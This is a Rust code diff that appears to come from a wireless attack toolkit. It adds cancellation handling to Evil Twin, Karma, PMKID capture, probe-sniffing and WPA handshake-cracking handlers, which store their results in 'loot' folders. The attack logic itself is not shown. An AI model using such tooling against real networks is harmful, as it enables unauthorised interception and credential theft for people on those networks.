-    .map_err(|e| anyhow::anyhow!("Evil Twin attack failed: {}", e))?;
+    let result = match execute_evil_twin_cancellable(
+        config,
+        Some(&loot_dir.to_string_lossy()),
+        cancel,
+        |msg| {
+            tracing::info!("Evil Twin: {}", msg);
+        },
+    ) {
+        Ok(result) => result,
+        Err(err) => {
+            let err_anyhow: anyhow::Error = err.into();
+            if is_cancelled_error(&err_anyhow) {
+                return Err(err_anyhow);
+            }
+            return Err(anyhow::anyhow!("Evil Twin attack failed: {}", err_anyhow));
+        }
+    };
 
     let target_label = args.ssid.clone();
     let log_file = if result.log_path.as_os_str().is_empty() {
@@ -3980,7 +4252,11 @@ fn handle_wifi_evil_twin(root: &Path, args: WifiEvilTwinArgs) -> Result<HandlerR
     Ok((message, data))
 }
 
-fn handle_wifi_pmkid(root: &Path, args: WifiPmkidArgs) -> Result<HandlerResult> {
+fn handle_wifi_pmkid(
+    root: &Path,
+    args: WifiPmkidArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     use crate::wireless_native::{self, PmkidCaptureConfig};
 
     tracing::info!("Starting PMKID capture on interface: {}", args.interface);
@@ -3996,6 +4272,7 @@ fn handle_wifi_pmkid(root: &Path, args: WifiPmkidArgs) -> Result<HandlerResult> 
     }
 
     enforce_single_interface(&args.interface)?;
+    check_cancel(cancel)?;
 
     // Check capabilities
     let caps = wireless_native::check_capabilities(&args.interface);
@@ -4023,9 +4300,14 @@ fn handle_wifi_pmkid(root: &Path, args: WifiPmkidArgs) -> Result<HandlerResult> 
     };
 
     // Execute the native PMKID capture
-    let result = wireless_native::execute_pmkid_capture(&loot_dir, &config, |progress, status| {
-        tracing::debug!("PMKID progress: {:.0}% - {}", progress * 100.0, status);
-    })?;
+    let result = wireless_native::execute_pmkid_capture_cancellable(
+        &loot_dir,
+        &config,
+        cancel,
+        |progress, status| {
+            tracing::debug!("PMKID progress: {:.0}% - {}", progress * 100.0, status);
+        },
+    )?;
 
     let target_label = args
         .ssid
@@ -4083,7 +4365,11 @@ fn handle_wifi_pmkid(root: &Path, args: WifiPmkidArgs) -> Result<HandlerResult> 
     Ok((message, data))
 }
 
-fn handle_wifi_probe_sniff(root: &Path, args: WifiProbeSniffArgs) -> Result<HandlerResult> {
+fn handle_wifi_probe_sniff(
+    root: &Path,
+    args: WifiProbeSniffArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     use crate::wireless_native::{self, ProbeSniffConfig as NativeProbeConfig};
 
     tracing::info!(
@@ -4102,6 +4388,7 @@ fn handle_wifi_probe_sniff(root: &Path, args: WifiProbeSniffArgs) -> Result<Hand
     }
 
     enforce_single_interface(&args.interface)?;
+    check_cancel(cancel)?;
 
     // Check capabilities
     let caps = wireless_native::check_capabilities(&args.interface);
@@ -4126,13 +4413,18 @@ fn handle_wifi_probe_sniff(root: &Path, args: WifiProbeSniffArgs) -> Result<Hand
     };
 
     // Execute the native probe sniff
-    let result = wireless_native::execute_probe_sniff(&loot_dir, &config, |progress, status| {
-        tracing::debug!(
-            "Probe sniff progress: {:.0}% - {}",
-            progress * 100.0,
-            status
-        );
-    })?;
+    let result = wireless_native::execute_probe_sniff_cancellable(
+        &loot_dir,
+        &config,
+        cancel,
+        |progress, status| {
+            tracing::debug!(
+                "Probe sniff progress: {:.0}% - {}",
+                progress * 100.0,
+                status
+            );
+        },
+    )?;
 
     let log_file = write_session_log(
         &session,
@@ -4169,7 +4461,11 @@ fn handle_wifi_probe_sniff(root: &Path, args: WifiProbeSniffArgs) -> Result<Hand
     ))
 }
 
-fn handle_wifi_karma(root: &Path, args: WifiKarmaArgs) -> Result<HandlerResult> {
+fn handle_wifi_karma(
+    root: &Path,
+    args: WifiKarmaArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     use crate::wireless_native::{self, KarmaAttackConfig};
 
     tracing::info!("Starting Karma attack on interface: {}", args.interface);
@@ -4183,6 +4479,8 @@ fn handle_wifi_karma(root: &Path, args: WifiKarmaArgs) -> Result<HandlerResult> 
     if !wireless_native::is_wireless_interface(&args.interface) {
         bail!("Interface {} is not a wireless interface", args.interface);
     }
+
+    check_cancel(cancel)?;
 
     // Check capabilities
     let caps = wireless_native::check_capabilities(&args.interface);
@@ -4245,9 +4543,14 @@ fn handle_wifi_karma(root: &Path, args: WifiKarmaArgs) -> Result<HandlerResult> 
     };
 
     // Execute the Karma attack
-    let result = wireless_native::execute_karma(&loot_dir, &config, |progress, status| {
-        tracing::debug!("Karma progress: {:.0}% - {}", progress * 100.0, status);
-    })?;
+    let result = wireless_native::execute_karma_cancellable(
+        &loot_dir,
+        &config,
+        cancel,
+        |progress, status| {
+            tracing::debug!("Karma progress: {:.0}% - {}", progress * 100.0, status);
+        },
+    )?;
 
     let log_file = write_session_log(
         &loot_session,
@@ -4291,10 +4594,15 @@ fn handle_wifi_karma(root: &Path, args: WifiKarmaArgs) -> Result<HandlerResult> 
     ))
 }
 
-fn handle_wifi_crack(root: &Path, args: WifiCrackArgs) -> Result<HandlerResult> {
+fn handle_wifi_crack(
+    root: &Path,
+    args: WifiCrackArgs,
+    cancel: Option<&CancelFlag>,
+) -> Result<HandlerResult> {
     use rustyjack_wpa::crack::{generate_ssid_passwords, quick_crack, CrackResult, WpaCracker};
     use rustyjack_wpa::handshake::HandshakeExport;
     use std::path::PathBuf;
+    use std::sync::Arc;
 
     tracing::info!("Starting handshake crack on file: {}", args.file);
 
@@ -4341,6 +4649,9 @@ fn handle_wifi_crack(root: &Path, args: WifiCrackArgs) -> Result<HandlerResult> 
     fs::create_dir_all(&parent_dir)?;
 
     let mut cracker = WpaCracker::new(bundle.handshake.clone(), &ssid);
+    if let Some(flag) = cancel {
+        cracker = cracker.with_stop_flag(Arc::clone(flag));
+    }
     let mut attempts = 0u64;
     let mut password: Option<String> = None;
 
@@ -4389,6 +4700,8 @@ fn handle_wifi_crack(root: &Path, args: WifiCrackArgs) -> Result<HandlerResult> 
     if attempts == 0 {
         attempts = cracker.attempts();
     }
+
+    check_cancel(cancel)?;
 
     // Save result if password found
     let mut loot_path = None;
